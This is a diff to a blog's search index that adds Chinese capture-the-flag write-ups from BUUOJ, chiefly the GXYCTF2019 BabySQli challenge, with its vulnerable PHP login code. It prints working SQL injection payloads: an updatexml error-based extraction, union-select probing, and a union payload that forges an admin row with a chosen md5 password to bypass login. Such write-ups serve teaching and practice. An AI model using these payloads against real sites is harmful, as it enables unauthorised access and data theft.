@@ -1273,12 +1273,53 @@ E#---
 <p>显示后面的flag</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=dad%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(right(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>下载的源码，有助于后面做题</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_query($con,<span class="string">'SET NAMES UTF8'</span>);</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'pw'</span>];</span><br><span class="line">$t_pw = md5($password);     <span class="comment">//对传入的password参数进行了md5加密</span></span><br><span class="line">$sql = <span class="string">"select * from user where username = '"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\(|\)|\=|or/"</span>, $name))&#123;  <span class="comment">//  过滤了() | = or </span></span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"do not hack me!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">		printf(<span class="string">"Error: %s\n"</span>, mysqli_error($con));</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// echo '&lt;pre&gt;';</span></span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		<span class="comment">// print_r($arr);</span></span><br><span class="line">		<span class="keyword">if</span>($arr[<span class="number">1</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(md5($password) == $arr[<span class="number">2</span>])&#123;    <span class="comment">//</span></span><br><span class="line">				<span class="keyword">echo</span> $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"wrong pass!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"wrong user!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便输入用户名和密码，查看源码，出现提示</p>
+<p><img src="/2020/10/05/buuoj/sqli1.png" alt></p>
+<p>试了试应该是base32，解码后是base64</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">c<span class="number">2</span><span class="attr">VsZWN0</span>ICogZ<span class="symbol">nJvbSB1</span>c<span class="number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="number">1</span>lID<span class="number">0</span>gJyRuYW<span class="number">1</span>lJw==</span><br></pre></td></tr></table></figure>
+
+<p>继续解码</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure>
+
+<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
+<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
+<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
+<p>值得注意的是，这题可以知道username是admin，</p>
+<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
+<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
+<p>接下来介绍一种新的union注入</p>
+<p>先建立一张表</p>
+<p><img src="/2020/10/05/buuoj/sqli3.png" alt></p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from test where id=<span class="number">0</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,'<span class="title">admin</span>','2322';</span></span><br></pre></td></tr></table></figure>
+
+<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
+<p><img src="/2020/10/05/buuoj/sqli2.png" alt></p>
+<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
+<p>这里就是 id=1,username=admin,password=2322</p>
+<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
+<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
+<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
+<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
+<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
+<p>payload:</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=000'union select 1,<span class="string">'admin'</span>,<span class="string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="attribute">pw</span>=1111</span><br></pre></td></tr></table></figure>
+
+<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
+<p><img src="/2020/10/05/buuoj/sqli.png" alt></p>
 ]]></content>
       <categories>
-        <category>ctf</category>
+        <category>buuoj</category>
       </categories>
       <tags>
-        <tag>盲注</tag>
+        <tag>二分注入</tag>
+        <tag>报错注入</tag>
+        <tag>union新姿势</tag>
       </tags>
   </entry>
 </search>
